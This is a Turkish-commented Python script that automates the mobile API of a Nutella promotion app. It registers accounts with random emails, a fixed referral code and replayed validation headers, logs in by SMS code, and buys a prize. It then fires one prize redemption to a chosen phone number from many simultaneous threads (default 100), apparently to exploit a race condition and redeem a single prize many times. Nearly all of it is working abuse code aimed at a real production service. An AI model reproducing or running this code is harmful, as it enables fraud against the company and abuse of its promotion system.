import requests
import json
import random
import string
import threading
import uuid


random_id = str(uuid.uuid4())

# --- 1. RASTGELE EMAIL ÜRETİCİ ---
def generate_random_email():
    """15 karakterli rastgele email oluşturur"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choices(chars, k=15)) + "@gmail.com"

# --- 2. KULLANICI KAYIT/GİRİŞ İŞLEMLERİ ---
class NutellaAuth:
    def __init__(self):
        self.base_headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'platform': 'android'
        }

    def register(self, phone_number):
        """Yeni hesap oluştur (sadece email rastgele)"""
        url = "https://prod.nutella.ai/app-api/api/v1/Auth/RegisterWithMsisdn"
        
        payload = {
            "firstname": "Kullanıcı",
            "lastname": str(random.randint(1000, 9999)),
            "gender": "Erkek",
            "email": generate_random_email(),
            "msisdn": phone_number,
            "dateOfBirth": "1999-01-30T23:55:00.000Z",
            "privacyPolicy": True,
            "termOfUse": True,
            "callConsent": True,
            "smsConsent": True,
            "emailConsent": True,
            "deviceToken": random_id,
            "referralCode": "PX727TNTC7"
        }

        headers = {**self.base_headers, **{
            'x-requestvalidator': 'Xi4Ua5GSiGks3sollkDBSw==',
            'x-device-id': random_id,
            'authorization': 'Bearer undefined'
        }}

        try:
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print(f"[✓] Kayıt başarılı! Email: {payload['email']}")
                return True
            print(f"[!] Kayıt hatası: {response.json()['message']}")
            return False
        except Exception as e:
            print(f"[!] Kayıt API hatası: {str(e)}")
            return False

    def login(self, phone_number):
        """Mevcut hesaba SMS gönder"""
        url = "https://prod.nutella.ai/app-api/api/v1/Auth/LoginWithMsisdn"
        
        headers = {**self.base_headers, **{
            'x-requestvalidator': '+KapwK43bbkQskSz8/GJRg==',
            'x-device-id': random_id,
            'authorization': 'Bearer undefined'
        }}

        try:
            response = requests.post(url, json={"msisdn": phone_number}, headers=headers)
            if response.status_code == 200:
                print("[✓] SMS gönderildi")
                return True
            print(f"[!] SMS gönderilemedi: {response.text}")
            return False
        except Exception as e:
            print(f"[!] Giriş API hatası: {str(e)}")
            return False

    def verify_otp(self, phone_number, pin_code):
        """SMS kodunu doğrula ve token al"""
        url = "https://prod.nutella.ai/app-api/api/v1/Auth/checkOtp"
        
        headers = {**self.base_headers, **{
            'x-requestvalidator': 'uGUp8Gjyku5m/mh4GkP8kQ==',
            'x-device-id': random_id,
            'authorization': 'Bearer undefined'
        }}

        try:
            response = requests.post(url, json={
                "msisdn": phone_number,
                "pincode": pin_code,
                "rememberMe": True,
                "deviceToken": random_id
            }, headers=headers)
            
            if response.status_code == 200:
                token = response.json().get('token', {}).get('accessToken')
                print(f"[✓] Token alındı: {token[:15]}...")
                return token
            print(f"[!] Doğrulama hatası: {response.text}")
            return None
        except Exception as e:
            print(f"[!] Doğrulama API hatası: {str(e)}")
            return None

# --- 3. ÖDÜL İŞLEMLERİ ---
class NutellaPrize:
    def __init__(self, access_token):
        self.access_token = access_token
        self.base_headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'platform': 'android',
            'authorization': f'Bearer {access_token}'
        }

    def buy_prize(self, prize_id=136):
        """Ödül satın al ve consumerPrizeId döndür"""
        url = "https://prod.nutella.ai/app-api/api/v1/Prizes/buy"
        
        headers = {**self.base_headers, **{
            'x-requestvalidator': 'PmjqT/eL645ZX6cLcdVf7g==',
            'x-device-id': random_id
        }}

        try:
            response = requests.post(url, json={
                "prizeId": prize_id,
                "currencyId": 1
            }, headers=headers)
            
            result = response.json()
            if result.get('success', False):
                return result.get('data', {}).get('consumerPrizeId')
            print(f"[!] Ödül alınamadı: {result.get('message')}")
            return None
        except Exception as e:
            print(f"[!] Satın alma hatası: {str(e)}")
            return None

    def send_prize(self, consumer_prize_id, target_phone):
        """Ödül gönderme işlemi"""
        url = "https://prod.nutella.ai/app-api/api/v1/Prizes/use/data"
        
        headers = {**self.base_headers, **{
            'x-requestvalidator': '06Rc8LEczwL+XAC7+CdHAQ==',
            'x-device-id': random_id
        }}

        try:
            response = requests.post(url, json={
                "consumerPrizeId": consumer_prize_id,
                "phone": target_phone
            }, headers=headers)
            
            result = response.json()
            print(f"[✓] Gönderim sonucu: {result.get('message')}")
            return result
        except Exception as e:
            print(f"[!] Gönderme hatası: {str(e)}")
            return None

# --- 4. THREAD YÖNETİCİ ---
class PrizeSender:
    def __init__(self, access_token, consumer_prize_id, target_phone):
        self.prize_client = NutellaPrize(access_token)
        self.consumer_prize_id = consumer_prize_id
        self.target_phone = target_phone

    def start_sending(self, thread_count=1):
        """Thread'lerle ödül gönderme"""
        threads = []
        for i in range(thread_count):
            t = threading.Thread(
                target=self.prize_client.send_prize,
                args=(self.consumer_prize_id, self.target_phone),
                name=f"Gönderici-{i+1}"
            )
            threads.append(t)
            t.start()
            print(f"[✓] {t.name} başlatıldı")
        
        for t in threads:
            t.join()

# --- ANA PROGRAM ---
def main():
    print("\n🔹 Nutella.ai Otomasyon Sistemi 🔹")
    print("="*40)
    
    # 1. Kullanıcı Giriş/Kayıt
    auth = NutellaAuth()
    phone = input("[→] Telefon numarası (örn: 5551234567): ").strip()
    
    print("\n[1] Yeni Kayıt\n[2] Mevcut Hesaba Giriş")
    choice = input("[→] Seçiminiz (1/2): ").strip()

    if choice == "1":
        if not auth.register(phone):
            return
    elif choice != "2":
        print("[!] Geçersiz seçim!")
        return

    if not auth.login(phone):
        return

    pin = input("[→] SMS kodunu girin: ").strip()
    access_token = auth.verify_otp(phone, pin)
    if not access_token:
        return

    # 2. Ödül İşlemleri
    prize_client = NutellaPrize(access_token)
    target_phone = input("[→] Ödül gönderilecek telefon numarası: ").strip()
    prize_id = input("[→] Ödül ID (Varsayılan: 136): ").strip() or 136
    
    # Tek seferlik ödül alımı
    consumer_prize_id = prize_client.buy_prize(int(prize_id))
    if not consumer_prize_id:
        return

    # Thread'lerle gönderim
    thread_count = int(input("[→] Gönderme thread sayısı: ").strip() or 100)
    print(f"\n[✓] Ödül hazır! ID: {consumer_prize_id}")
    print(f"[!] {thread_count} thread ile gönderim başlıyor...\n")
    
    sender = PrizeSender(access_token, consumer_prize_id, target_phone)
    sender.start_sending(thread_count)
    
    print("\n[✓] Tüm gönderim işlemleri tamamlandı!")

if __name__ == "__main__":
    main()
